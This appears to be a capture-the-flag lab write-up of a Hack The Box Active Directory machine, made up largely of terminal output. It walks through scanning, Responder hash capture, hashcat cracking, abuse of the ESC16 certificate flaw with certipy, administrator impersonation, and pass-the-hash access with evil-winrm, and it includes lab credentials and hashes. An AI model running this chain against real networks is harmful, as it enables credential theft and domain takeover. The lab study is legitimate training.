


```sh
┌──(mracherr㉿serveur)-[~/tmp_lab/forest]
└─$ nmap 10.129.63.247
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-15 16:28 +0200
Nmap scan report for 10.129.63.247
Host is up (0.15s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds


```


```sh
┌──(mracherr㉿serveur)-[~/tmp_lab/forest]
└─$ nmap 10.129.63.247 -sC -sV
Host is up (0.16s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-15 21:29:41Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-15T21:31:04+00:00; +7h00m42s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-09-15T21:31:05+00:00; +7h00m43s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-15T21:31:04+00:00; +7h00m43s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-15T21:31:05+00:00; +7h00m42s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-15T21:30:28
|_  start_date: N/A
|_clock-skew: mean: 7h00m42s, deviation: 0s, median: 7h00m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.71 seconds


```

## all port 

```sh
──(venv)─(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ nmap 10.129.64.2 -p- -T5 -Pn                                                                    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-15 18:16 +0200
Nmap scan report for 10.129.64.2
Host is up (0.20s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49681/tcp open  unknown
49682/tcp open  unknown
49693/tcp open  unknown
49706/tcp open  unknown
49719/tcp open  unknown
49741/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 629.07 seconds

```


[[824e66abf23e457ec88f06bbf61ae1f2_MD5.jpg|Open: Pasted image 20260915163950.png]]
![[824e66abf23e457ec88f06bbf61ae1f2_MD5.jpg]]\



# smb enumeration 



```sh
┌──(mracherr㉿serveur)-[~/tools/BloodHound-linux-x64]
└─$ smbclient -L //10.129.64.2 -U 'j.fleischman%J0elTHEM4n1990!'

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.64.2 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


```

```
┌──(mracherr㉿serveur)-[~/tools/BloodHound-linux-x64]
└─$ netexec smb 10.129.64.2 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.64.2     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.64.2     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.64.2     445    DC01             [*] Enumerated shares
SMB         10.129.64.2     445    DC01             Share           Permissions     Remark
SMB         10.129.64.2     445    DC01             -----           -----------     ------
SMB         10.129.64.2     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.64.2     445    DC01             C$                              Default share
SMB         10.129.64.2     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.64.2     445    DC01             IT              READ,WRITE
SMB         10.129.64.2     445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.64.2     445    DC01             SYSVOL          READ            Logon server share

```



```sh

┌──(mracherr㉿serveur)-[~/tmp_lab/forest]
└─$ sudo responder -I tun0 -v
[sudo] password for mracherr:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.17.245]
    Responder IPv6             [fe80::eccf:db54:ee37:a7cf]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-X7X62TVAF4D]
    Responder Domain Name      [5ODQ.LOCAL]
    Responder DCE-RPC Port     [48021]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.64.2
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:60cfc89cc3b953db:90789538FBE653D90E3DB6F4D35A30D5:010100000000000000A1A7564145DD016CABEC2DF7FCCD1A000000000200080035004F004400510001001E00570049004E002D005800370058003600320054005600410046003400440004003400570049004E002D00580037005800360032005400560041004600340044002E0035004F00440051002E004C004F00430041004C000300140035004F00440051002E004C004F00430041004C000500140035004F00440051002E004C004F00430041004C000700080000A1A7564145DD0106000400020000000800300030000000000000000100000000200000DA66BFE21DF069C10355EC4A8B2FB5C0E5AADE739827E73506E9F06409523C110A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003200340035000000000000000000

```


```sh
┌──(mracherr㉿serveur)-[~/tmp_lab/fluffy]
└─$ hashcat -m 5600 -a 0 hash.txt  /usr/share/wordlists/rockyou.txt.gz
hashcat (v7.1.2) starting

Host memory allocated for this attack: 516 MB (5823 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

P.AGILA::FLUFFY:60cfc89cc3b953db:90789538fbe653d90e3db6f4d35a30d5:010100000000000000a1a7564145dd016cabec2df7fccd1a000000000200080035004f004400510001001e00570049004e002d005800370058003600320054005600410046003400440004003400570049004e002d00580037005800360032005400560041004600340044002e0035004f00440051002e004c004f00430041004c000300140035004f00440051002e004c004f00430041004c000500140035004f00440051002e004c004f00430041004c000700080000a1a7564145dd0106000400020000000800300030000000000000000100000000200000da66bfe21df069c10355ec4a8b2fb5c0e5aade739827e73506e9f06409523c110a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310037002e003200340035000000000000000000:prometheusx-303



Started: Tue Sep 15 18:42:47 2026
Stopped: Tue Sep 15 18:42:51 2026

```


`p.agila` `prometheusx-303`





# privilge to root



```sh
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

```sh
┌──(venv)─(mracherr㉿serveur)-[~/tools/pywhisker]
└─$ certipy-ad find -u LDAP_SVC -hashes ':22151d74ba3de931a352cba1f9393a37' -dc-ip 10.129.232.88 -ns 10.129.232.88 -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260920064415_Certipy.txt'
[*] Wrote text output to '20260920064415_Certipy.txt'
[*] Saving JSON output to '20260920064415_Certipy.json'
[*] Wrote JSON output to '20260920064415_Certipy.json'

```



```sh
┌──(venv)─(mracherr㉿serveur)-[~/tools/pywhisker]
└─$ certipy-ad auth -pfx administrator.pfx  -username administrator -dc-ip 10.129.232.88 -ns 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[-] Username or domain is not specified, and identity information was not found in the certificate


```

```sh
┌──(venv)─(mracherr㉿serveur)-[~/tools/pywhisker]
└─$ certipy-ad req -u administrator -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -ns 10.129.232.88 -ca fluffy-DC01-CA -template User
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 30
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

[[BOXES/35. fluffy/attachments/7127365f289e97aab6a78bae25744c3e_MD5.jpg|Open: Pasted image 20260920071839.png]]
![[BOXES/35. fluffy/attachments/7127365f289e97aab6a78bae25744c3e_MD5.jpg]]


```
┌──(venv)─(mracherr㉿serveur)-[~/tools/pywhisker]
└─$ certipy-ad account update -u ca_svc -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -ns 10.129.232.88 -user ca_svc -upn ca_svc@fluffy.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'


```

```sh
┌──(venv)─(mracherr㉿serveur)-[~/tools/pywhisker]
└─$ certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.232.88 -username administrator
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 

```




```sh
──(mracherr㉿serveur)-[~/tools/SharpHound/ff]
└─$ evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/19/2026   2:50 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5eec526b0a1cb1cf2167b9a194667d6a



```
